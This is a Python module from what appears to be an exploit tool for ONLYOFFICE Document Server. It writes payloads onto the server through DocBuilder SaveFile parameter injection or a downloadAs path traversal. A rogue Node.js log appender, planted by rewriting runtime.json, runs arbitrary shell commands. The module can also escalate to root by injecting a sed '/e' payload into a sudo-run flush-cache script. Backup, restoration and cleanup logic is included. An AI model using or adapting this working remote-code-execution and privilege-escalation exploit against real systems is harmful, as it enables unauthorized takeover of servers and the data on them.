"""Command payloads, state backups and artifact reporting for both write routes."""

from __future__ import annotations

import base64
import io
import json
import shlex
import time
import uuid
import zipfile
from pathlib import Path

from onlyoffice_common import (
    DocumentServer,
    ExploitError,
    OutputFile,
    TransportError,
    read_server_file,
    status,
)

DATA = "/var/www/onlyoffice/Data"
RUNTIME = DATA + "/runtime.json"
API = "/var/www/onlyoffice/documentserver/web-apps/apps/api/documents/api.js"


def add_execution_args(parser) -> None:
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        default=Path("artifacts"),
        help="local parent for private run manifests and original configuration backups",
    )
    parser.add_argument(
        "--runtime-absent",
        action="store_true",
        help="assert runtime.json is absent when it cannot be read; see README",
    )
    parser.add_argument(
        "--keep-artifacts",
        action="store_true",
        help="retain injected target configuration/payloads for manual inspection",
    )


def encoded_write(data: bytes, path: str) -> str:
    encoded = base64.b64encode(data).decode("ascii")
    return f"printf '%s' {shlex.quote(encoded)} | base64 -d > {shlex.quote(path)}"


class Execution:
    def __init__(
        self,
        client: DocumentServer,
        token: str,
        command: str,
        *,
        as_root: bool,
        artifacts_dir: Path,
        runtime_absent: bool,
        keep_artifacts: bool,
    ):
        self.client, self.token, self.command = client, token, command
        self.as_root, self.keep = as_root, keep_artifacts
        self.nonce = uuid.uuid4().hex
        self.module = f"r7-appender-{self.nonce}.js"
        self.script = f"r7-command-{self.nonce}.sh"
        # A ds-owned precreated result in sticky /tmp can be unwritable even by
        # root with fs.protected_regular enabled. Data allows a private ds-owned
        # result to remain readable through DocBuilder after root execution.
        self.output = f"{DATA}/r7-result-{self.nonce}"
        self.ack = f"{DATA}/r7-helper-{self.nonce}.json"
        self.lock = f"{DATA}/r7-lock-{self.nonce}"
        self.exit_tag = f"R7_EXIT_{self.nonce}:"
        self.cleanup_tag = f"R7_CLEANUP_{self.nonce}:"
        self.archive = f"r7-{self.nonce}.zip"
        artifacts_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
        self.directory = artifacts_dir / self.nonce
        self.directory.mkdir(mode=0o700)
        self.manifest = {
            "run": self.nonce,
            "target": client.origin,
            "root": as_root,
            "state": "preparing",
            "cleanup": "not started",
            "target_payloads": [
                f"{DATA}/{self.module}",
                f"{DATA}/{self.script}",
                self.lock,
                self.ack,
                self.ack + ".tmp",
            ],
            "target_result_retained": self.output,
            "runtime": RUNTIME,
            "api_modified_by_helper": API if as_root else None,
            "staged_archive_possible": f"/tmp/nativeZip/{self.archive}",
            "cache": "DocBuilder/save job data remains subject to server TTL",
        }
        self.update()
        status(f"[*] private run record: {self.directory}")
        self.original_runtime = read_server_file(client, token, RUNTIME, unavailable_ok=True)
        if self.original_runtime is None and not runtime_absent:
            raise ExploitError(
                "runtime.json could not be read; absence cannot be distinguished from denied access. "
                "Use --runtime-absent only if you know it is absent. No payload was installed."
            )
        self.manifest["runtime_prior_state"] = (
            "assumed absent by operator" if self.original_runtime is None else "backed up"
        )
        if self.original_runtime is not None:
            try:
                runtime_config = json.loads(self.original_runtime)
            except (ValueError, UnicodeError):
                raise ExploitError(
                    "existing runtime.json is not valid JSON; no payload was installed"
                ) from None
            if not isinstance(runtime_config, dict):
                raise ExploitError("existing runtime.json is not a JSON object; no payload was installed")
            with OutputFile(self.directory / "runtime.json.before") as output:
                output.write(self.original_runtime)
        self.original_api = read_server_file(client, token, API) if as_root else None
        self.original_api_template = None
        self.expected_api = None
        if self.original_api is not None:
            with OutputFile(self.directory / "api.js.before") as output:
                output.write(self.original_api)
            template = read_server_file(client, token, API + ".tpl")
            self.original_api_template = template
            if b"{{HASH_POSTFIX}}" not in template:
                raise ExploitError("unsupported root-helper API template; no payload was installed")
            # The /e injection executes each matching template line; the command
            # writes to its own result file, leaving no stdout in that API line.
            self.expected_api = b"".join(
                (b"\n" if line.endswith(b"\n") else b"") if b"{{HASH_POSTFIX}}" in line else line
                for line in template.splitlines(keepends=True)
            )
        self.runtime = json.dumps(
            {
                "log": {
                    "options": {
                        "appenders": {"default": {"type": f"{DATA}/{self.module}"}},
                        "categories": {"default": {"appenders": ["default"], "level": "WARN"}},
                    }
                }
            },
            separators=(",", ":"),
        ).encode()
        self.update(state="prepared")

    def __enter__(self):
        return self

    def __exit__(self, kind, _error, _traceback):
        if kind is not None:
            try:
                self.update(
                    state="interrupted" if issubclass(kind, KeyboardInterrupt) else "failed",
                    failed_stage=self.manifest.get("state"),
                    failure=kind.__name__,
                )
            except OSError:
                status(f"[-] could not update run record: {self.directory}")
            status(f"[*] inspect the artifact record after failure: {self.directory}")

    def update(self, **fields) -> None:
        self.manifest.update(fields)
        with OutputFile(self.directory / "manifest.json", overwrite=True) as output:
            output.write((json.dumps(self.manifest, indent=2) + "\n").encode())

    def command_script(self) -> bytes:
        # Root helper's sed -i renames api.js after its injected shell exits. The
        # detached restorer waits for the Node callback, which runs after sudo exits.
        # Restoring from inside the sed evaluation itself would lose the restoration.
        runtime_write = (
            encoded_write(self.original_runtime, RUNTIME)
            if self.original_runtime is not None
            else f"rm -f -- {shlex.quote(RUNTIME)}"
        )
        expected_runtime = base64.b64encode(self.runtime).decode("ascii")
        api_write = ":"
        if self.original_api is not None:
            expected_api = base64.b64encode(self.expected_api).decode("ascii")
            api_write = f"""if printf '%s' {shlex.quote(expected_api)} | base64 -d | cmp -s - {shlex.quote(API)}; then
    {encoded_write(self.original_api, API)} || cleanup=failed
else
    cleanup=api_changed
fi"""
        files = [
            f"{DATA}/{self.module}",
            f"{DATA}/{self.script}",
            self.lock,
            self.ack,
            self.ack + ".tmp",
            f"/tmp/nativeZip/{self.archive}",
        ]
        remove = "rm -f -- " + " ".join(shlex.quote(path) for path in files)
        cleanup = f"""cleanup=ok
if printf '%s' {shlex.quote(expected_runtime)} | base64 -d | cmp -s - {shlex.quote(RUNTIME)}; then
    {runtime_write} || cleanup=failed
else
    cleanup=runtime_changed
fi
{api_write} || cleanup=failed
if [ "$cleanup" = ok ]; then
    {remove} || cleanup=failed
fi"""
        if self.keep:
            cleanup = "cleanup=kept"
        finish = f"""{cleanup}
printf '\\n{self.exit_tag}%s\\n{self.cleanup_tag}%s\\n' "$command_status" "$cleanup" >> {shlex.quote(self.output)}"""
        if self.as_root:
            finish = f"""(
    count=0
    while [ ! -f {shlex.quote(self.ack)} ] && [ "$count" -lt 120 ]; do
        sleep 1
        count=$((count + 1))
    done
    if [ ! -f {shlex.quote(self.ack)} ]; then
        printf '\\n{self.exit_tag}%s\\n{self.cleanup_tag}helper_wait_failed\\n' "$command_status" >> {shlex.quote(self.output)}
        exit 1
    fi
    {finish}
) </dev/null >/dev/null 2>&1 &"""
        return f"""#!/bin/sh
/bin/sh -c {shlex.quote(self.command)} > {shlex.quote(self.output)} 2>&1
command_status=$?
{finish}
exit 0
""".encode()

    def appender(self) -> bytes:
        script_path = f"{DATA}/{self.script}"
        if self.as_root:
            command = f"/bin/sh {script_path} >/dev/null 2>&1"
            escaped = command.replace("/", "\\/")
            payload = f"';{escaped};#'/e;#"
            executable = "/usr/bin/sudo"
            args = ["/usr/bin/documentserver-flush-cache.sh", "--hash", payload, "--restart", "false"]
        else:
            executable, args = "/bin/sh", [script_path]
        callback_condition = "true" if self.as_root else "error"
        return f"""const fs = require("fs");
exports.configure = () => () => {{}};
try {{
    const lock = fs.openSync({json.dumps(self.lock)}, "wx", 0o600);
    fs.closeSync(lock);
    const result = fs.openSync({json.dumps(self.output)}, "wx", 0o600);
    fs.closeSync(result);
    require("child_process").execFile({json.dumps(executable)}, {json.dumps(args)},
        {{timeout: 0}}, (error) => {{
            if ({callback_condition}) {{
                fs.writeFileSync({json.dumps(self.ack + ".tmp")}, JSON.stringify({{exit: error ? error.code : 0}}), {{mode: 0o600}});
                fs.renameSync({json.dumps(self.ack + ".tmp")}, {json.dumps(self.ack)});
            }}
        }});
}} catch (error) {{
    if (error.code !== "EEXIST") throw error;
}}
""".encode()

    def payloads(self) -> list[tuple[str, bytes]]:
        return [
            (f"{DATA}/{self.module}", self.appender()),
            (f"{DATA}/{self.script}", self.command_script()),
            (RUNTIME, self.runtime),
        ]

    def savefile_script(self) -> str:
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for path, payload in self.payloads():
                archive.writestr(path.rsplit("/", 1)[-1], payload)
        outer = io.BytesIO()
        with zipfile.ZipFile(outer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(self.archive, inner.getvalue())
        encoded = base64.b64encode(outer.getvalue()).decode("ascii")
        params = (
            f"<m_sFileFrom>/tmp/nativeZip/{self.archive}</m_sFileFrom>"
            f"<m_sFileTo>{DATA}</m_sFileTo><m_nFormatFrom>2057</m_nFormatFrom><m_nFormatTo>0</m_nFormatTo>"
        )
        return f'''builder.CreateFile("docx");
native.SetFilePath("/tmp/r7-{self.nonce}-placeholder");
native.ZipOpenBase64("{encoded}");
builder.SaveFile("docx", "safe.docx", {json.dumps(params)});
builder.CloseFile();'''

    def install_savefile(self) -> None:
        script = self.savefile_script()
        self.verify_preinstall()
        self.update(state="installing", route="SaveFile parameter injection")
        try:
            self.client.submit_builder(self.token, script)
        except TransportError as error:
            if error.kind != "ReadTimeout":
                raise
            self.update(state="delivery unconfirmed")
            status("[*] delivery response timed out; checking for command output without resubmitting")
            return
        self.update(state="submitted")

    def install_traversal(self, session_token: str, document_key: str) -> None:
        self.verify_preinstall()
        self.update(state="installing", route="downloadAs format traversal")
        for path, payload in self.payloads():
            save_key = self.client.reserve_save(session_token, document_key)
            if path == RUNTIME:
                self.verify_preinstall()
            self.client.write_server_file(session_token, document_key, save_key, path, payload)
        self.update(state="submitted")

    def verify_preinstall(self) -> None:
        # These remote reads are not an atomic compare-and-swap. Operators must
        # coordinate all configuration writers throughout installation and cleanup.
        originals = [(RUNTIME, self.original_runtime)]
        if self.original_api is not None:
            originals.extend([(API, self.original_api), (API + ".tpl", self.original_api_template)])
        for path, original in originals:
            current = read_server_file(self.client, self.token, path, unavailable_ok=True)
            if current != original:
                self.update(preinstall_check="failed", changed_configuration=path)
                raise ExploitError(
                    f"configuration changed or became unreadable since backup: {path}. "
                    "No configuration replacement submitted; staged payloads may remain. See the run manifest."
                )
        self.update(preinstall_check="matched backup or operator's absence assumption")

    def wait(self, timeout: float) -> tuple[bytes, int, str]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            data = read_server_file(
                self.client, self.token, self.output, unavailable_ok=True, timeout=min(15, remaining)
            )
            result = self.parse_result(data or b"")
            if result is not None:
                output, code, cleanup = result
                with OutputFile(self.directory / "command-output.bin") as local:
                    local.write(output)
                self.update(state="command finished", remote_exit=code, cleanup=cleanup)
                if cleanup == "ok":
                    self.verify_restoration()
                status(f"[+] command completed with remote exit status {code}")
                status(f"[*] target cleanup: {cleanup}; result file retained at {self.output}")
                return output, code, cleanup
            ack = read_server_file(
                self.client,
                self.token,
                self.ack,
                unavailable_ok=True,
                timeout=min(15, max(0.01, deadline - time.monotonic())),
            )
            if ack:
                try:
                    exit_code = json.loads(ack).get("exit")
                except (ValueError, AttributeError):
                    raise ExploitError("execution helper returned a malformed completion record") from None
                if exit_code not in (0, None):
                    raise ExploitError(
                        f"execution helper exited with status {exit_code}; see the run manifest"
                    )
            time.sleep(min(0.5, max(0, deadline - time.monotonic())))
        self.update(state="timed out", cleanup="unconfirmed")
        raise ExploitError(
            "timed out waiting for complete command output; target execution may continue. "
            f"Artifact record: {self.directory}"
        )

    def parse_result(self, data: bytes) -> tuple[bytes, int, str] | None:
        exit_marker, cleanup_marker = ("\n" + self.exit_tag).encode(), ("\n" + self.cleanup_tag).encode()
        if exit_marker not in data or cleanup_marker not in data or not data.endswith(b"\n"):
            return None
        output, tail = data.rsplit(exit_marker, 1)
        code, cleanup = tail.split(cleanup_marker, 1)
        try:
            result = int(code), cleanup.strip().decode("ascii")
        except (ValueError, UnicodeError):
            raise ExploitError("command completion record is malformed") from None
        return output, result[0], result[1]

    def verify_restoration(self) -> None:
        current = read_server_file(self.client, self.token, RUNTIME, unavailable_ok=True)
        if current != self.original_runtime:
            self.update(cleanup="runtime verification failed")
            raise ExploitError("runtime.json restoration could not be verified; see the run manifest")
        if (
            self.original_api is not None
            and read_server_file(self.client, self.token, API, unavailable_ok=True) != self.original_api
        ):
            self.update(cleanup="api.js verification failed")
            raise ExploitError("api.js restoration could not be verified; see the run manifest")
        runtime_result = (
            "original bytes verified"
            if self.original_runtime is not None
            else "payload reported deletion; file could not be independently read; absence not proven"
        )
        restoration = {RUNTIME: runtime_result}
        if self.original_api is not None:
            restoration[API] = "original bytes verified"
        self.update(restoration=restoration, restoration_metadata="original metadata not recovered")
        status(f"[*] runtime.json restoration: {runtime_result}")
